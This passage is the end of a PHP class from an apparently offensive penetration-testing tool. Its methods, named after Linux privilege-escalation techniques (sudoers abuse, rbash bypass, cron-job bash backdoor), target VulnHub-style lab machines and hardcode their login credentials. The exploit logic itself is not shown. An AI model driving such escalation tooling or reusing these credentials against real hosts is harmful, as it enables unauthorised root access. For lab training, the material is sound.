        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8users2sudoers8filepath(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        $ip = "10.60.10.133"; // Lin.Security v1.0
        $port = "22";
        $protocol = "T";
        $login = "insecurity" ;
        $pass = "P@ssw0rd";
        $login = "root" ;
        $pass = "secret123";
        $login = "susan" ;
        $pass = "MySuperS3cretValue!";
        $login = "bob" ;
        $pass = "secret";
        
        $ip = "10.60.10.162"; // unknowndevice64  1
        $port = "1337";
        $protocol = "T";
        $login = "ud64";
        $pass = "1M!#64@ud";
        
        
        
        $titre = "";
        $fonction2exec = "users";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8users2root(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        $ip = "10.60.10.133"; // Lin.Security v1.0
        $port = "22";
        $protocol = "T";
        
        $login = "bob" ;
        $pass = "secret";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8users2sudoers2app2cmd(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        $ip = "10.60.10.143"; // DC-6
        $port = "22";
        $protocol = "T";
        $login = "graham" ;
        $pass = "GSo7isUM1D4";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    
    public function poc4root8users2sudoers2app2read8teehee(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        $ip = "10.60.10.142"; // DC-4
        $port = "22";
        $protocol = "T";
        $login = "jim" ;
        $pass = "jibril04";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    public function poc4root8users2sudoers2nopassword(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        
        $ip = $this->k2; // Cyberry
        $port = "22";
        $protocol = "T";
        $login = "user" ;
        $pass = "password";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    
    
    public function poc4bypass_restricted_path(){ // OK
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
               
        $ip = "10.60.10.163"; // 64Base 1.01 OK 
        $port = "62964";
        $protocol = "T";
       $login = "64base" ;
        $pass = 'NjRiYXNlNWgzNzcK';
        $titre = "restricted Bash - rbash";
        $fonction2exec = "lan2start";
        $vm = "";
        
        
        $ip = "10.60.10.141"; // DC-2 HAND -> TP
        $port = "7744";
        $protocol = "T";
        $login = "tom" ;
        $pass = 'parturient';
        $titre = "restricted Bash - rbash";
        $fonction2exec = "lan2start";
        $vm = "";
        
        $ip = "10.60.10.140"; // Matrix 1 - TP
        $port = "22";
        $protocol = "T";
        $login = "guest" ;
        $pass = 'k1ll0r7n';
        $titre = "restricted Bash - rbash";
        $fonction2exec = "lan2start";
        $vm = "";
        
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
        
    }
    
    
    
    
    
    public function poc4root8jobs8file2backdoor4bash(){
        $this->ssTitre(__FUNCTION__);
        $eth = 'vmnet6';
        $domain = 'hack.vlan';
        
        
        $ip = "10.60.10.132"; // Escalate Linux
        $port = "80";
        $protocol = "T";
        
        $login = "";
        $pass = "";
        $titre = "";
        $fonction2exec = "";
        $vm = "";
        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);

        
    }
    
    
    
    
    
    
}
?>